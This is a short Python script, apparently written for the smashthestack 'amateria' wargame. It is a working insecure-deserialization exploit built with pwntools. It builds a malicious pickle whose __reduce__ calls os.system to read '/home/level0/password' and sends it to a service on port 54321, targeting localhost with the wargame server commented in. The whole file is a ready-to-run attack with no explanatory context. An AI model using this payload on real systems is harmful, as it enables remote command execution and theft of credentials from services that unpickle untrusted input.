import cPickle
from pwn import *
import os
import base64

localhost = '127.0.0.1'
server = 'amateria.smashthestack.org'

class exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /home/level0/password',),)

def serialize():
    return cPickle.dumps(exploit())

def insecure_deserialize(exploit):
    cPickle.loads(exploit)

shellcode = serialize()

conn = remote(localhost, 54321)
#conn = remote(server, 54321)
conn.send(shellcode)

print conn.recvuntil('bye')
